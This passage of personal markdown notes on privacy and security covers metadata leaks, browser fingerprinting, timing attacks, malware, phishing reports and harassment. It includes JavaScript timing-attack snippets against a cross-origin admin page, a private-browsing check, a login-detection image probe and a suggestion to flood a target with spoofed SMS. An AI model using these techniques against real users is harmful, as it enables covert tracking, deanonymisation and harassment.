- [SMS Spoofing with Python for Good and Evil – The Durk Web](http://www.thedurkweb.com/sms-spoofing-with-python-for-good-and-evil/) - [SMS Spoofing with Python for Good and Evil : Python](https://www.reddit.com/r/Python/comments/6dtp3d/sms_spoofing_with_python_for_good_and_evil/)
- [How do I show my mobile number when sending SMS text messages from Skype?](https://support.skype.com/en/faq/FA672/how-do-i-show-my-mobile-number-when-sending-sms-text-messages-from-skype)
- [Loi n° 2004-575 du 21 juin 2004 pour la confiance dans l'économie numérique | Legifrance](https://www.legifrance.gouv.fr/affichTexte.do?cidTexte=JORFTEXT000000801164&dateTexte=)
- [Loi n° 78-17 du 6 janvier 1978 relative à l'informatique, aux fichiers et aux libertés | Legifrance](https://www.legifrance.gouv.fr/affichTexte.do?cidTexte=LEGITEXT000006068624&dateTexte=20090813)
- [Country Specific Features and Restrictions – Knowledgebase](https://help.nexmo.com/hc/en-us/sections/200622473-Country-Specific-Features-and-Restrictions)
- [A guide to succesful international SMS messages: international rules and guideli](https://www.cmtelecom.com/newsroom/sending-international-sms-country-specific-rules-regulations-and-habits)

## Privacy and identification

- Hidden input allow the webpage get more infos than the user want to share (with autocomplete)
	* [Oversharing with the browser’s autofill / Stoyan's phpied.com](http://www.phpied.com/oversharing-with-the-browsers-autofill/)
	* https://twitter.com/anttiviljami/status/816585860661518336
- [Have I been pwned? Check if your email has been compromised in a data breach](https://haveibeenpwned.com/)
- [Did you know that the NSA uses Uber Drivers and Soccer Moms to Spy on You?](https://medium.com/@amuse/did-you-know-that-the-nsa-uses-uber-drivers-and-soccer-moms-to-spy-on-you-d912fe74befd)
- [Restore Privacy | Your online privacy resource center](https://restoreprivacy.com/)

- [OSINT Search Tool by IntelTechnique | Open Source Intelligence](https://inteltechniques.com/menu.html)
- [Michael Bazzell' Blog  » Blog Archive   » Updated OSINT Flowcharts](https://inteltechniques.com/blog/2018/03/06/updated-osint-flowcharts/)

### Nothing to hide argument

- [Facebook Graph Shortcuts](http://graph.tips/)
- [Je n'ai rien à cacher.](http://jenairienacacher.fr/)
- [Rien à cacher (argument) — Wikipédia](https://fr.wikipedia.org/wiki/Rien_%C3%A0_cacher_%28argument%29)
- [Lettre ouverte à ceux qui n’ont rien à cacher | InternetActu.net](http://www.internetactu.net/2010/05/21/lettre-ouverte-a-ceux-qui-nont-rien-a-cacher/)
- [Google Analytics In Real Life - Online Checkout - YouTube](https://www.youtube.com/watch?v=3Sk7cOqB9Dk)
- Social experiment about privacy about public toilets [Snoopers Charter - Very public toilet - YouTube](https://www.youtube.com/watch?v=_-RSravgi_Y)

### HTTP Referer

Referrer (correct spelling)

- [Everything you could ever want to know (and more) about controlling the Referer header | FastMail Blog](https://blog.fastmail.com/2016/06/20/everything-you-could-ever-want-to-know-and-more-about-controlling-the-referer-header/)
- `Referrer-Policy` HTTP header [Referrer-Policy - HTTP | MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy)
- `<meta name="referrer" content="same-origin">` prevent to transmit referrer (ex: contains a sensitive URL)
- `referrerpolicy` attribute [\<a\> - HTML | MDN](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/a#attr-referrerpolicy)

### Any data can contains private information

Uploading a document can expose/leak private data. This data and metadata should be stripped if exposed publicly.

- Any file:
	* File name: [More Than Meets The Eye - The Hacker Factor Blog](http://www.hackerfactor.com/blog/index.php?/archives/565-More-Than-Meets-The-Eye.html) - generator, last used tool/service
- Picture:
	* (EXIF) author
	* (EXIF) location
	* (EXIF) editor
	* human faces
	* plate number
	* serial number
	* credit card number
	* phone number
	* human fingerprint / eye iris
	* user name / account
	* address
	
	Directly or in reflects
- Word document:
	* author
	* [changes](https://support.office.com/en-us/article/Track-changes-while-you-edit-024158a3-7e62-4f05-8bb7-dc3ecf0295c4), etc.
- HTTP protocol:
	* Some ISP add specific headers. See [Header Enrichment or ISP Enrichment? Emerging Privacy Threats in Mobile Networks - headerenrichment15.pdf](https://www.icsi.berkeley.edu/pubs/networking/headerenrichment15.pdf)

Metadata:

- [Metadata](Image#medata)
- [Metadata removal tool - Wikipedia, the free encyclopedia](https://en.wikipedia.org/wiki/Metadata_removal_tool)
- [Remove hidden data and personal information by inspecting documents - Office Support](https://support.office.com/en-us/article/Remove-hidden-data-and-personal-information-by-inspecting-documents-356b7b5d-77af-44fe-a07f-9aa4d085966f)
- [Document Metadata Extraction - ForensicsWiki](http://www.forensicswiki.org/wiki/Document_Metadata_Extraction)
- [Exchangeable image file format - Wikipedia, the free encyclopedia - Privacy and security](https://en.wikipedia.org/wiki/Exchangeable_image_file_format#Privacy_and_security)
- [FotoForensics](http://fotoforensics.com/tutorial-meta.php)

Recover data from corrupted stream/storage medium:

- [SANS SIFT Kit/Workstation: Investigative Forensic Toolkit Download](http://digital-forensics.sans.org/community/downloads)
- [CAINE Live USB/DVD - computer forensics digital forensics](http://www.caine-live.net/)
- [How to build your first digital forensics lab on a budget | SecurityWatch](http://bhconsulting.ie/securitywatch/?p=3045)
- [DEFT Linux - Computer Forensics live CD |](http://www.deftlinux.net/)
- [Autopsy](http://www.sleuthkit.org/autopsy/)
- [Forensic Toolkit (FTK) | AccessData](http://accessdata.com/solutions/digital-forensics/forensic-toolkit-ftk)
- [PhotoRec - Digital Picture and File Recovery](http://www.cgsecurity.org/wiki/PhotoRec)
- [Digital Image Forensic Analyzer - imageforensic.org](http://www.imageforensic.org/)
- [PC Inspector - kostenlose Software für die Datenrettung von CONVAR - Die Datenretter.](http://www.pcinspector.de/Default.htm?language=1)
- [Download Recuva | Recover deleted files, free!](https://www.ccleaner.com/recuva)
- [FreeUndelete - OfficeRecovery.com](http://www.officerecovery.com/freeundelete/)

Example of leak:

- [Le dragueur trahi par sa clef USB - virtualabs.fr](http://www.virtualabs.fr/Le-dragueur-trahi-par-sa-clef-USB)

### Fingerprinting

- [Entropy](https://en.wikipedia.org/wiki/Entropy_(information_theory))

See also

- [Temporary user tracking in major browsers and Cross-domain information leakage and attacks](https://web.archive.org/web/20141214141849/http://landing2.trusteer.com/sites/default/files/Temporary_User_Tracking_in_Major_Browsers.pdf)
- [p0f v3](http://lcamtuf.coredump.cx/p0f3/) - P0f is a tool that utilizes an array of sophisticated, purely passive traffic fingerprinting mechanisms to identify the players behind any incidental TCP/IP communications
- [Now sites can fingerprint you online even when you use multiple browsers | Ars Technica UK](https://arstechnica.co.uk/security/2017/02/now-sites-can-fingerprint-you-online-even-when-you-use-multiple-browsers/) - Use WebGL capabilities. See [crossbrowsertracking_NDSS17.pdf](http://yinzhicao.org/TrackingFree/crossbrowsertracking_NDSS17.pdf)
- How advertisers merge user profiles with cookie syncing [Privacy Conference - Keynote: Lorrie Cranor - YouTube](https://www.youtube.com/watch?v=G7QOJ6lmXGg&t=31m20s) (end 40m11s)
- [acsac2016-device-fingerprinting.pdf](http://people.scs.carleton.ca/~paulv/papers/acsac2016-device-fingerprinting.pdf)
- [Security/Anonymous Browsing - MozillaWiki](https://wiki.mozilla.org/Security/Anonymous_Browsing)
- [A Primer on Information Theory and Privacy | Electronic Frontier Foundation](https://www.eff.org/deeplinks/2010/01/primer-information-theory-and-privacy)
- [How Unique Is Your Web Browser?](https://panopticlick.eff.org/browser-uniqueness.pdf)
- [Fingerprinting - MozillaWiki](https://wiki.mozilla.org/Fingerprinting)
- [Zombie cookie — Wikipedia](https://en.wikipedia.org/wiki/Zombie_cookie)
- [HTTP cookie — Wikipedia](https://en.wikipedia.org/wiki/HTTP_cookie#Alternatives_to_cookies)
- [Tracking the Trackers: Microsoft Advertising | Center for Internet and Society](http://cyberlaw.stanford.edu/blog/2011/08/tracking-trackers-microsoft-advertising)
- [BrowserLeaks.com — Web Browser Security Checklist for Identity Theft Protection](https://www.browserleaks.com/)
- [anonymous browser fingerprinting - valve's](http://valve.github.io/blog/2013/07/14/anonymous-browser-fingerprinting/) and https://github.com/Valve/fingerprintjs2
- [Legal Guidelines For The Use Of Location Data On The Web – Smashing Magazine](https://www.smashingmagazine.com/2016/03/location-data-web-development-and-the-law/)
- [Technical analysis of client identification mechanisms - The Chromium Projects](https://www.chromium.org/Home/chromium-security/client-identification-mechanisms)
- [Online tracking: A 1-million-site measurement and analysis](https://webtransparency.cs.princeton.edu/webcensus/index.html)
- [PowerPoint Presentation - Is_preventing_browser_fingerprinting_a_lost_cause.pdf](https://www.w3.org/wiki/images/7/7d/Is_preventing_browser_fingerprinting_a_lost_cause.pdf)
- https://github.com/Valve/fingerprintjs2
- [phaseIII.eps - 1503.01408.pdf](https://arxiv.org/pdf/1503.01408.pdf)
- [JavaScript and Daylight Savings for tracking users. | Application Security](https://www.idontplaydarts.com/2011/10/javascript-and-daylight-savings-for-tracking-users/) - each country have timezone and daylight different rules, across the history
- [Fingerprinting Firefox users with cached intermediate CA certificates (#fiprinca) - shift or die](https://shiftordie.de/blog/2017/02/21/fingerprinting-firefox-users-with-cached-intermediate-ca-certificates-fiprinca/)
- [Printers | Electronic Frontier Foundation](https://www.eff.org/issues/printers) - Pinter watermarks
- [Pixel Perfect: Fingerprinting Canvas in HTML5](https://hovav.net/ucsd/dist/canvas.pdf)

Other

- [Cancel That Card | Share a little](http://cancelthat.cc/), an automated service that tweets at people who post pictures of their credit or debit cards online
- [Privacy - Manage Your Privacy - Apple](http://www.apple.com/privacy/manage-your-privacy/)
- [Privacy - Approach to Privacy - Apple](http://www.apple.com/privacy/approach-to-privacy/)

To protect against entropy and protect privacy (obfuscation): generate noise, fake informations

- [Opt Out From Online Behavioral Advertising By Participating Companies (BETA)](http://www.aboutads.info/choices/)
- [TrackMeNot](http://cs.nyu.edu/trackmenot/)
- [Obfuscation | The MIT Press](https://mitpress.mit.edu/books/obfuscation)
- https://addons.mozilla.org/en-US/firefox/addon/canvasblocker/

Tools to finger print web browsers:

- [Panopticlick](https://panopticlick.eff.org/)
- [Browserprint](https://browserprint.info/)
- [Device Fingerprint](http://noc.to/)

#### Timing attack

Can use side-channel leaks (time attack) to measure time of the response for cache data, HSTS, system/browser files, etc.

Use a resource (like image or video).

This example is inaccurate, mainly measure download time (impact of the network) of the resource:

	const image = new Image();
	image.onerror = function(){
		// Stop timer
		const end = performance.now();
		const delta = end - start;
		console.log(`Loading took ${delta}ms.`);
	};
	// Start timer
	const start = performance.now();
	image.src = "https://example.com/admin.php";// invalid image
	// The login form page is returned quicker than full admin page (less HTML code to load)

An improved example:

	const video = document.createElement("video");
	let start = NaN;
	// suspend event: download complete
	video.onsuspend = function(){
		// Start timer
		start = performance.now();
	}
	// error event: parsing complete
	video.onerror = function(){
		// Stop timer
		const end = performance.now();
		const delta = end - start;
		console.log(`Loading took ${delta}ms.`);
	};
	video.src = "https://example.com/admin.php";// invalid video

An other example using Service worker (Cache Storage Attack):

	const url = "https://example.com/admin.php";
	const dummyRequest = new Request("dummy");
	let start = NaN;
	fetch(url, {
		credentials: "include",
		mode: "no-cors"
	}).then(function(response){
		// download complete
		// Start timer
		start = performance.now();
		return cache.put(dummyRequest, response.clone());
	}).then(function(){
		// resource stored in the cache
		// Stop timer
		const end = performance.now();
		const delta = end - start;
		console.log(`Loading took ${delta}ms.`);
	})

	Compare 2 string take less time if string provided is small or start with identical chars (for same length), etc. like using a safe string compare (time is less impacted by optimizations):
	
		// Not executed faster depends b
		function safeCompare(a, b) {
			a = String(a);
			b = String(b);
			var length = a.length;
			var result = 0;
			
			if (length !== b.length) {
				b = a;
				result = 1;
			}
			
			for (let index = 0; index < length; index++) {
				result |= (a.charCodeAt(index) ^ b.charCodeAt(index));// XOR
			}
			
			return result === 0;
		};
	
	Compare password hash, etc.:
	
	See

- [PHP: rfc:timing_attack](https://wiki.php.net/rfc/timing_attack)
- [PHP: hash_equals - Manual](http://php.net/manual/en/function.hash-equals.php)
- [PHP: password_verify - Manual](http://php.net/manual/en/function.password-verify.php)
- [Mathias Bynens — Front-End Performance: The Dark Side on Vimeo](https://vimeo.com/163113209#t=1m34s)
- [sirdarckcat: [Matryoshka] - Web Application Timing Attacks (or.. Timing Attacks against JavaScript Applications in Browsers)](http://sirdarckcat.blogspot.fr/2014/05/matryoshka-web-application-timing.html)
- [Using Node.js Event Loop for Timing Attacks](https://snyk.io/blog/node-js-timing-attack-ccc-ctf/)
- [Dev.Opera — Front-End Performance: The Dark Side](https://dev.opera.com/blog/timing-attacks/)
- [Timing Attacks in the Modern Web - tom.vg](https://tom.vg/2016/08/browser-based-timing-attacks/)
- [Mathias Bynens on Twitter: "More about timing attacks on the web...](https://twitter.com/mathias/status/760359100177846272)
- [Browser-based Timing Attacks](https://labs.tom.vg/browser-based-timing-attacks/)
- [Mathias Bynens — Front-End Performance: The Dark Side on Vimeo](https://vimeo.com/163113209#t=8m22s)
- [Mathias Bynens — Front-End Performance: The Dark Side on Vimeo](https://vimeo.com/163113209#t=15m19s)
- [Academic - VaGoSec](https://vagosec.org/academic/#ccs2015-timing)
- [Constant-Time Character Encoding in PHP Projects](https://github.com/paragonie/constant_time_encoding)
- [Timing attack — Wikipedia](https://en.wikipedia.org/wiki/Timing_attack)

#### Private mode

	try { localStorage.test = 2; } catch (e) {
		alert('You are in Private Browsing mode (in Safari)');
	}

Note: will not works with Chrome's Incognito Mode

- [ios - (How) Can a web site determine if Safari Private Browsing is turned on? - Ask Different](http://apple.stackexchange.com/questions/131587/how-can-a-web-site-determine-if-safari-private-browsing-is-turned-on/131588)
- [web browser - Can web sites detect whether you are using private browsing mode? - Information Security Stack Exchange](http://security.stackexchange.com/questions/9037/can-web-sites-detect-whether-you-are-using-private-browsing-mode)

#### Native application is installed

iOS and Android

Allow to open native apps with custom arguments

- [Open native application](Web#open-native-application)
- [Twitter detect installed Apps on iOS `canOpenURL`](https://gist.github.com/genadyo/295a5e8f0d743f57137f)
	http://nikf.org/blog/twitter-ads-app-detection
	[Andreas Kurtz on Twitter: "iOS Twitter determines installed apps by checking the 2.551 custom URI schemes (canOpenURL) listed in main bundle's app_store_app_data.json"](https://twitter.com/aykay/status/537976040996749312)
- Discover and Hack URL Handlers: [ouspg/urlhandlers: Discover and Hack URL handlers](https://github.com/ouspg/urlhandlers) and [Discover and Hack URL Handlers (Prototype)](http://hack.urlhandlers.info/)

#### Other data

User:

- typing speed
- facial recognition
- vocal inflexions
- room ambiance (sound)
- reflex delay

Software and hardware:

- protocol supported / used (+ meta data in this protocol)
	* [Fingerprinting Browsers Using Protocol Handlers](http://itsecuritysolutions.org/2010-03-29_fingerprinting_browsers_using_protocol_handlers/)
	* [Links to local pages do not work - MozillaZine Knowledge Base](http://kb.mozillazine.org/Links_to_local_pages_don't_work)
	* [browser - Open Explorer window from Website - Stack Overflow](https://stackoverflow.com/questions/1431112/open-explorer-window-from-website)
	* [Per-domain Configurable Security Policies are no longer available (Affected) | Firefox Site Compatibility](https://www.fxsitecompat.com/en-CA/docs/2014/per-domain-configurable-security-policies-are-no-longer-available/)
- format supported by the video, audio, image (Accept header and Accept-Encoding) same as OS+Hardware+browser ?
- Canvas fingerprint, same as OS+Hardware+browser
	* [Canvas fingerprinting — Wikipedia](https://en.wikipedia.org/wiki/Canvas_fingerprinting)
	* https://www.browserleaks.com/canvas
- Video decoder finderprint: Colors are not decoded the same way and can cause a difference
	* https://stackoverflow.com/questions/28603552/html5-video-color-difference-chrome-internet-explorer
	[Digital video fingerprinting — Wikipedia](https://en.wikipedia.org/wiki/Digital_video_fingerprinting)
- `getClientRects()` fingerpint (browser rendering engine, fonts installed)
	* [Advanced Tor Browser Fingerprinting](http://jcarlosnorte.com/security/2016/03/06/advanced-tor-browser-fingerprinting.html#getclientrects-fingerprinting)
- `AudioContext` fingerprint
	* [AudioContext Fingerprint Test Page](https://audiofingerprint.openwpm.com/)
- browser (User-Agent header)
- screen size, color depth, pixel ratio, GPU
	* `screen.*`
	* [WEBGL_debug_renderer_info - Web APIs | MDN](https://developer.mozilla.org/en-US/docs/Web/API/WEBGL_debug_renderer_info)
- battery status
	> When battery is running low, people might be prone to some - otherwise different - decisions
	— [Battery Status readout as a privacy risk](https://blog.lukaszolejnik.com/battery-status-readout-as-a-privacy-risk/)
	
	> When your phone is down to 5 per cent battery and that little icon on the iphone turns red, people start saying I’d better get home or I don’t know how I’m going to get home otherwise
	— [Keith Chen Is Uber's Head Of Economics And Decides When Uber Surges Price : NPR](http://www.npr.org/2016/05/17/478266839/this-is-your-brain-on-uber)
	
	> The amount of battery users had left was “one of the strongest predictors of whether or not you are going to be sensitive to surge” – in other words, agree to pay 1.5 times, 2 times or more the normal cost of a journey
	— [Uber knows when your phone is running out of battery | The Independent](http://www.independent.co.uk/life-style/gadgets-and-tech/news/uber-knows-when-your-phone-is-about-to-run-out-of-battery-a7042416.html)
- OS
- CPU speed (use webworker for intensive task)
- available plugins
- time zone
- cookies and other storages systems (`window.name`, Web Storage, browser cache)
	* [Samy Kamkar - evercookie - virtually irrevocable persistent cookies](http://samy.pl/evercookie/) and [samyk/evercookie: Produce persistent, respawning "super" cookie in a browser, abusing over a dozen techniques. It goal i to identify user after they've removed standard cookie and other privacy data such a Flash cookie (LSOs), HTML5 storage, SilverLight storage, and others.](https://github.com/samyk/evercookie)
- Mouse move and mouse wheel deltas
- History via
	* CSS `:visited` selector (before March 2010) https://developer.mozilla.org/en-US/docs/Web/CSS/Privacy_and_the_:visited_selector [Jeremiah Grossman: I know where you've been](http://blog.jeremiahgrossman.com/2006/08/i-know-where-youve-been.html)
	* HSTS (detect to detect history of HTTPS visited websites using HSTS)
		- [Sniffy](https://zyan.scripts.mit.edu/sniffly/) and https://github.com/diracdeltas/sniffly
		- [RadicalResearch HSTS Super Cookies](http://www.radicalresearch.co.uk/lab/hstssupercookies)
	* cache systems (ServiceWorkers, HTTP headers ETags, etc.)
	* cross domain cookies
- system/browser files (load with iframe src, etc.): `res://C:\\Program Files\\Fiddler2\\Fiddler.exe/#3/#32512`, `chrome://ghostery/content/options.html`, `resource:///defaults/preferences/firefox.js`
	* [863246 – resource:// URIs leak information](https://bugzilla.mozilla.org/show_bug.cgi?id=863246)
	* https://github.com/beefproject/beef/wiki/Module:-browser-fingerprint
	* https://blog.malwarebytes.com/cybercrime/exploits/2016/06/neutrino-ek-fingerprinting-in-a-flash/ http://malware.dontneedcoffee.com/2014/10/cve-2013-7331-and-exploit-kits.html
- available fonts
- geolocation
- IP address
- language(s) (Accept-Language header)
- cookies disabled, javascript disabled, popup disabled
- [Device fingerprint — Wikipedia](https://en.wikipedia.org/wiki/Device_fingerprint) [TCP/IP stack fingerprinting — Wikipedia](https://en.wikipedia.org/wiki/TCP/IP_stack_fingerprinting)
- installed apps
- OS/Browser UI: (macOS, Windows, Linux) scrollbar size, input default styles, etc.
- third party autentification
	Use login auth mecanisms to detect if the user is logged in:
	
		<img onload="alert('logged in to Facebook')" onerror="alert('not logged in to Facebook')" src="https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Ffavicon.ico">

	* [Your Social Media Fingerprint](https://robinlinus.github.io/socialmedia-leak/)
- The feature, font used in a document can used to detect the original creation date / year
	- [Les polices de caractères incorporées dans des outils comme Office pourraient servir d'indicateurs, pour détecter les fraudeurs](https://www.developpez.com/actu/149640/Les-polices-de-caracteres-incorporees-dans-des-outils-comme-Office-pourraient-servir-d-indicateurs-pour-detecter-les-fraudeurs/)
	- [Dani Rodrik's weblog: Did Microsoft steal its fonts from the Turkish army?](http://rodrik.typepad.com/dani_rodriks_weblog/2012/10/did-microsoft-steal-its-fonts-from-the-turkish-army.html)
	- [How Microsoft’s Calibri font doomed Sharif family in Panama Case – Daily Pakistan](https://en.dailypakistan.com.pk/pakistan/how-microsofts-calibri-font-doomed-sharif-family-in-panama-case/)

## Malware

Types: ransomware, etc.

> SMTP stands for Simple Malware Transport Protocol.
— [Kevin Beaumont](https://twitter.com/GossiTheDog/status/809152384924614657)

- Detect and report ransomware: [Crypto Sheriff — The No More Ransom Project](https://www.nomoreransom.org/crypto-sheriff.php)
- [How malware bypassing anti-viruses work](Straight Pole + Curved Hole Illusion.mp4)
- [Malware — Wikipedia](https://en.wikipedia.org/wiki/Malware)
- [svent/jsdetox: A Javascript malware analysis tool](https://github.com/svent/jsdetox)
- [Microsoft Malware Protection Center - How Microsoft antimalware products identify potentially unwanted software](http://www.microsoft.com/security/portal/mmpc/shared/objectivecriteria.aspx)
- [Malware Domain List](https://www.malwaredomainlist.com/)
- [Marco Cova's Blog » malware](http://wayback.archive.org/web/20100729194334/http://www.cs.ucsb.edu/~marco/blog/malware/)
- [zynamics.com - BinDiff](https://www.zynamics.com/bindiff.html)
- [Readers of popular websites targeted by stealthy Stegano exploit kit hiding in pixels of malicious ads](http://www.welivesecurity.com/2016/12/06/readers-popular-websites-targeted-stealthy-stegano-exploit-kit-hiding-pixels-malicious-ads/)
- [Evolved DNSChanger malware slings evil ads at PCs, hijacks routers • The Register](http://www.theregister.co.uk/2016/12/20/new_dnschanger_exploit_kit_goes_after_166_types_of_router/)
- [Massive AdGholas Malvertising Campaigns Use Steganography and File Whitelisting to Hide in Plain Sight | Proofpoint](https://www.proofpoint.com/us/threat-insight/post/massive-adgholas-malvertising-campaigns-use-steganography-and-file-whitelisting-to-hide-in-plain-sight)
- [Mac Malware of 2016 - Objective-See](https://objective-see.com/blog/blog_0x16.html)
- [RAA - An entirely new JS ransomware delivering Pony malware - ReaQta](https://reaqta.com/2016/06/raa-ransomware-delivering-pony/) https://news.ycombinator.com/item?id=11934717 https://gist.github.com/Antelox/020c727e1917bd018441cb6425cae397
- [FotoForensics - Malware](http://fotoforensics.com/tutorial-malware.php)
- [Helpful(?) coding tips from the CIA’s school of hacks | Ars Technica](https://arstechnica.com/security/2017/03/malware-101-the-cias-dos-and-donts-for-tool-developers/)

## DDoS

Could be a protest, a capabilities test, etc.

- [Definition of DDoS, Attack Types & Characteristics Glossary | Corero](https://www.corero.com/resources/glossary.html)
- [Denial-of-service attack — Wikipedia](https://en.wikipedia.org/wiki/Denial-of-service_attack)

> 10MB + 10x CC to the same email = 100MB into the inbox while you sent only 10MB

> Subscribe to more than 1000 mailing-list will flood your mailbox

## SPAM and Phishing

A targeted fishing after a smartphone has been stolen, to get unlock the protection [This is what Apple should tell you when you lose your iPhone](https://hackernoon.com/this-is-what-apple-should-tell-you-when-you-lose-your-iphone-8f07cf73cf82#)

- [Warning: beware of fake TibiaMaps.io copies! · TibiaMaps.io](https://tibiamaps.io/blog/phishing) - Phishers copy site, add malware, & buy Google ads to make them appear above the original website in search results
- [Phishing — Wikipedia](https://en.wikipedia.org/wiki/Phishing)
- [Email spoofing — Wikipedia](https://en.wikipedia.org/wiki/Email_spoofing)

### Report

	Return-Path: <user@sender.com>
	Delivered-To: user@receiver.com
	Received: ...
	Received: ...
	Received: ...
	Received: from [AA.BB.CC.DD] (port=54579 helo=blah.com)
		by emailrelay.com
		(envelope-from <user@sender.com>)
	From: Sender <user@sender.com>
	To: "Receiver" <user@receiver.com>
	Subject: SPAM

`whois AA.BB.CC.DD`, search for `OrgAbuseEmail`

Report at abuse that address or to `abuse@...domain...`

- [internet-signalement.gouv.fr - Portail officiel de signalements de contenus illicites - Accueil](https://www.internet-signalement.gouv.fr/PortailWeb/planets/Accueil!input.action)
- [Phishing Initiative](https://phishing-initiative.fr/contrib/)
- [Report a Suspected Web Forgery](https://safebrowsing.google.com/safebrowsing/report_phish/) `hl=en&url=http%3A%2F%2Fexample.com`
- [Signal Spam](https://www.signal-spam.fr/)
- [Report Phishing | APWG](http://www.antiphishing.org/report-phishing/)

## Wi-Fi

- [KisMac2 – security tool for Wi-Fi](https://igrsoft.com/en/kismac2/) https://github.com/IGRSoft/KisMac2

## Harassment

Aka spontaneous events, flash mob, strike, protest, sit-in (sit-in against a business , DoS IRL), etc.

Could handle the mass of people, crowd overtake

Issues: health, order, safety, etc.

- [Spoofed Grindr Accounts Turned One Man’s Life Into a ‘Living Hell’ | WIRED](https://www.wired.com/2017/01/grinder-lawsuit-spoofed-accounts/)
- [Thousands attend Mexican girl's 15th birthday party after social media invite goes viral](http://www.telegraph.co.uk/news/2016/12/27/thousands-attend-mexican-girls-party-social-media-invite-went/)
- [Girl, 14, fears 21,000 party guests after Facebook invite blunder - Telegraph](http://www.telegraph.co.uk/technology/facebook/8012043/Girl-14-fears-21000-party-guests-after-Facebook-invite-blunder.html)
- [1,500 People Attend Girl's Birthday Party After Public Facebook Invite](http://mashable.com/2011/06/06/facebook-party/)
- [Harassment — Wikipedia](https://en.wikipedia.org/wiki/Harassment)
- [Wrong Number Puts Rotterdam, NY, at Center of Turkey-Netherlands Rift](https://www.dailydot.com/layer8/turkey-netherlands-rotterdam-wrong-number-protest/) - People call the wrong phone number, Rotterdam Police could refer to Politie Rotterdam, Netherlands or Rotterdam Police Department, New York, USA
- [A Tweet to Kurt Eichenwald, a Strobe and a Seizure. Now, an Arrest. - The New York Times](https://www.nytimes.com/2017/03/17/technology/social-media-attack-that-set-off-a-seizure-leads-to-an-arrest.html) - Send a blink GIF to a [photosensitive epilepsy](https://en.wikipedia.org/wiki/Photosensitive_epilepsy) person.
- [Dennō Senshi Porygon — Wikipedia](https://en.wikipedia.org/wiki/Denn%C5%8D_Senshi_Porygon#Reception_and_controversy) - trigger a seizure in vulnerable users with a movie (contains flashes) or with strobe lights
- Use [Virtual mobile number](https://en.wikipedia.org/wiki/Virtual_number) or [spoof SMS](#sms-spoofing) to send lot of SMS to one target (DDoS)
- [An interesting thought on IRL equivalence of DDOS attacks on a business. I'd love to hear your thoughts. : DepthHub](https://www.reddit.com/r/DepthHub/comments/ejqyb/an_interesting_thought_on_irl_equivalence_of_ddos/)

See [DDoS](#ddos)
See [Usurpation & social engineering](#usurpation--social-engineering)

## Sabotage

black hat trolling, social sabotage, guerilla

- [Simple Sabotage Field Manual by United States. Office of Strategic Services - Ebook libre](http://www.gutenberg.org/ebooks/26184?msg=welcome_stranger) - Declassified OSS document
- [L'art du sabotage social par Horizon Gull - Montbazon 2016 - YouTube](https://www.youtube.com/watch?v=hSXSdr9hoMk) - see [Être stupide, où l’art du sabotage social selon les leçons de la CIA](http://www.hacking-social.com/2016/05/09/etre-stupide-ou-lart-du-sabotage-social-selon-les-lecons-de-la-cia/) and [CIA-conseil-sabotage-social.pdf](http://www.hacking-social.com/wp-content/uploads/2016/05/CIA-conseil-sabotage-social.pdf)

## Backup

- [You Need a Backup](http://nothingofvalue.org/backup.html) [AdmiralAsshat/nothing_of_value: Source for my personal website.](https://github.com/AdmiralAsshat/nothing_of_value)
- https://infosec.uthscsa.edu/sites/default/files/documents/Backup.pdf
